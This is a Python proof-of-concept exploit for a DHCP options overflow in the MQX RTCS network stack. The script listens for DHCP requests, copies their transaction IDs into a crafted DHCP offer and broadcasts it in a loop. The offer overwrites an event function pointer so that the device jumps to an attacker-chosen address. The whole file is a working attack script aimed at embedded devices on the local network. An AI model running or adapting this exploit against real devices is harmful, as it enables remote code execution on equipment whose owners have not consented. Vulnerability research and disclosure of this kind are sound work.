#!/usr/bin/python3
"""PoC for MQX RTCS code execution via DHCP options overflow.

This is just a quick hack to prove the vulnerability and was designed to run
on a private network with the target device.
"""

import datetime
import socket

def main():
    """Use a default valid DHCP packet to overwrite an event function pointer."""
    execute_addr = 0xFFFFFFFF
    exploit_pkt = bytearray.fromhex(' \
                    02 01 06 00 a5 d3 0b 2f 00 00 80 00 00 00 00 00 \
                    ff ff ff ff ff ff ff ff 00 00 00 00 ff ff ff ff \
                    ff ff 00 00 00 00 00 00 00 00 00 00 00 00 00 00 \
                    00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 \
                    00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 \
                    00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 \
                    00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 \
                    00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 \
                    00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 \
                    00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 \
                    00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 \
                    00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 \
                    00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 \
                    00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 \
                    00 00 00 00 00 00 00 00 00 00 00 00 63 82 53 63 \
                    35 01 02 36 04 ff ff ff ff 01 04 ff ff ff 00 43 \
                    98 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 \
                    00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 \
                    00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 \
                    00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 \
                    00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 \
                    00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 \
                    00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 \
                    00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 \
                    00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 \
                    00 00 00 00 00 ff ff ff ff ff')

    exploit_pkt[0x195:0x199] = execute_addr.to_bytes(4, byteorder='big')

    recv_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    recv_sock.bind(('', 67))

    send_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    send_sock.bind(('', 68))

    send_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    send_sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)

    while True:
        print("{}: Waiting for DHCP packet...".format(datetime.datetime.now()))
        # Transaction IDs need to match else RTCS will throw out the packet.
        data = recv_sock.recvfrom(1024)[0]
        exploit_pkt[4:8] = data[4:8]
        send_sock.sendto(exploit_pkt, ('<broadcast>', 68))
        print("{}: Transmitted 0x{:X} PC redirection packet.".format(
            datetime.datetime.now(), execute_addr))

if __name__ == "__main__":
    main()